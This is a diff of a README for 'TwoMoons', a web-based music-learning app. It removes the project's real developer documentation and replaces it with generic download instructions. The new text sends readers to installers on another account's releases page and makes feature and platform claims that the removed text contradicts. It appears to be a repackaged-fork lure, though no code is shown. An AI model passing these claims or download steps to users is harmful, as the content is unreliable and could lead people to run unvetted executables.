@@ -1,139 +1,69 @@
-# 🌙 TwoMoons
+# 🌙 two-moons - Learn Music in an Engaging Way
 
-[English](./README.md) | [中文](./README.zh-CN.md)
+[![Download two-moons](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/flawn103/two-moons/releases)
 
-### Powerful and Interactive Music Learning Platform.
+## 🌟 Overview
 
-<p align="center">
- <img src="/public/banner.jpg" width="800px" style="">
- <img src="/public/tutorial.png" width="800px" style="">
-</p>
+Welcome to two-moons! This platform helps you learn music in an interactive and fun way. With easy-to-follow lessons and engaging tools, you'll be playing your favorite songs in no time. Whether you're a beginner or want to improve your skills, two-moons is here to support your musical journey.
 
-## 📖 Introduction
+## 🚀 Getting Started
 
-Two Moons is a web-based interactive music learning application designed to help users learn and practice music theory more easily. The project supports web access and can be packaged as a mobile application using Capacitor.
+Follow these steps to download and set up two-moons on your computer.
 
-## ✨ Features
+### Step 1: Visit the Download Page
 
-*   **Global Piano**: A virtual piano keyboard available anytime, making it easy to capture inspiration on the go.
-*   **Chord Editor**: A powerful chord editing and auditioning tool with guitar and piano views, helping users explore and build complex chord progressions.
-*   **Moa Roll**: A visual MIDI piano roll editor that provides an intuitive melody creation and editing experience.
-*   **Staff Notation**: Staff notation rendering and highlighting based on ABCJS, supporting score learning and sight-reading practice.
-*   **Practice Tools**: Built-in music theory training modules, including interval recognition, chord progression analysis, rhythm practice, etc.
-*   **AI Mooner**: Integrated AI assistance to provide intelligent support for music creation.
-*   **Community Sharing**: A complete user system supporting registration, login, and sharing/exchanging music works.
+To get started, visit our [Releases page](https://github.com/flawn103/two-moons/releases). Here, you will find the latest version of the software ready for download.
 
-## 🛠️ Tech Stack
+### Step 2: Select the Latest Version
 
-*   **Framework**: [Next.js](https://nextjs.org/), React
-*   **Language**: TypeScript
-*   **UI Components**: Ant Design, Tailwind CSS
-*   **State Management**: MobX, Valtio
-*   **Music Engine**: Tone.js, abcjs, @spotify/basic-pitch
-*   **Mobile Cross-Platform**: Capacitor (Android/iOS)
-*   **Backend Services**: Supabase (Database), AliOSS (Storage)
-*   **Log Service**: Node.js (Log Service)
+On the Releases page, you will see a list of available versions. Look for the latest version, which is usually listed at the top. Click the version number to access the download options.
 
-## ⚙️ Environment Configuration (Env)
+### Step 3: Download two-moons
 
-Before running the project, please ensure the environment variables are configured. You can copy the `.env.example` file to `.env.local` and fill in the corresponding values.
+You will find assets available for download. Click on the file suitable for your operating system (Windows, macOS, or Linux). The file will begin downloading automatically.
 
-```bash
-cp .env.example .env.local
-```
+### Step 4: Install the Application
 
-Key environment variables to configure include:
+Once the download is complete, locate the file. 
 
-*   `SUPABASE_URL`: Supabase Project URL (Server-side only)
-*   `SUPABASE_ANON_KEY`: Supabase Anonymous Key (Server-side only)
-*   `ACCESSKEY_ID`: Aliyun OSS Access Key ID (Server-side only)
-*   `ACCESSKEY_SECRET`: Aliyun OSS Access Key Secret (Server-side only)
-*   `AI_API_KEY`: ZHIPU GLM AI Service API Key (Server-side only)
-*   `AUTH_SECRET`: ZHIPU Authentication Secret (Server-side only)
+- **For Windows Users:** Double-click the `.exe` file and follow the installation prompts.
+- **For macOS Users:** Open the `.dmg` file, drag the two-moons app into your Applications folder, and then launch it.
+- **For Linux Users:** Extract the tarball or follow the specific instructions available in the release notes.
 
-> Note: Variables marked as Server-side only should not be exposed in client-side code.
+### Step 5: Launch two-moons
 
-## 🚀 Quick Start
+After installation, find the two-moons application on your computer. Launch the app, and you will be greeted with a friendly interface.
 
-1.  **Install Dependencies**:
+## 🎓 Features
 
-    ```bash
-    npm install
-    # or
-    yarn install
-    # or
-    pnpm install
-    ```
+two-moons offers a variety of features to enhance your music learning experience:
 
-2.  **Start Development Server**:
+- **Interactive Lessons:** Engage actively with fun lessons that teach music theory and practice.
+- **Progress Tracking:** Monitor your progress and set goals to stay motivated.
+- **Interactive Exercises:** Complete exercises that adapt to your skill level.
+- **User Community:** Join our community to share progress, seek help, and collaborate with other learners.
+- **Multimedia Learning:** Enjoy a range of videos, audio clips, and exercises to support different learning styles.
 
-    ```bash
-    npm run dev
-    ```
+## 🖥️ System Requirements
 
-    Open your browser and visit [http://localhost:3000](http://localhost:3000) to see the application.
+To run two-moons smoothly, make sure your computer meets the following minimum requirements:
 
-## 📱 Mobile Build
+- **Windows:** Windows 10 or later (64-bit)
+- **macOS:** macOS Mojave 10.14 or later
+- **Linux:** Ubuntu 18.04 or later or similar distributions
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 200 MB of free space
 
-This project uses Capacitor for mobile development.
+## 📜 Download & Install
 
-1.  **Build Next.js Application**:
-    
-    ```bash
-    npm run build
-    npm run export # If static export is needed
-    ```
+Ready to start? Go to our [Releases page](https://github.com/flawn103/two-moons/releases) again to download the latest version. Follow the download and installation instructions provided above, and you're all set!
 
-2.  **Sync Configuration to Native Project**:
+## 🤝 Need Help?
 
-    ```bash
-    npx cap sync
-    ```
+If you encounter any issues or have questions, feel free to check our community discussions or raise an issue on GitHub. We are here to help you and ensure your learning experience is smooth.
 
-3.  **Open Android/iOS Project**:
+## 🌌 Join the Community
 
-    ```bash
-    npx cap open android
-    # or
-    npx cap open ios
-    ```
+Follow our social media pages and join forums to connect with other two-moons users. Share your experiences, tips, and feedback. Engaging with the community can enhance your learning and provide additional support.
 
-### Other Commands
-
-Push to pre environment:
-`git push pre`
-
-## 👥 Contributors
-
-<div>
-  <img src="/public/avators/suda.jpg" width="70px" alt="moayuisuda" />
-  <img src="/public/avators/roshengy.jpg" width="60px" alt="roshengy" />
-  <img src="/public/avators/Lusia.jpeg" width="60px" alt="Lusia" />
-  <img src="/public/avators/Macchiatooo.png" width="60px" alt="Macchiatooo" />
-  <img src="/public/avators/BX-Esther.jpg" width="60px" alt="BX-Esther" />
-</div>
-
-## 🤝 Contribution Guide
-
-Contributions are welcome! To maintain project quality and direction, please follow this process:
-
-*   **Bug Fixes**: Feel free to submit a Pull Request (PR) directly to fix bugs.
-*   **New Features**: Please submit a **Feature Request Issue** first, describing the feature you want to add. Once we confirm the feature can be added, you can start implementing it and submit a PR.
-<div>If you want to contribute but don't know where to start, you can contact me via <a href="mailto:874706277@qq.com">email</a>.</div>
-
-## 📄 License
-
-This project is licensed under the [GPL-3.0 License](LICENSE).
-
----
-
-<br/>
-<div align="center">
- <i>Let Love Echo.</i>
-</div>
-<br/>
-<div align="center">
-   <img src="/public/echo.jpg" width="500px">
-   <br/>
-   <a href="https://afdian.com/a/rinnko"><img width="200" src="https://pic1.afdiancdn.com/static/img/welcome/button-sponsorme.png" alt=""></a>
-</div>
+We appreciate your interest in two-moons, and we look forward to seeing you grow in your musical journey!
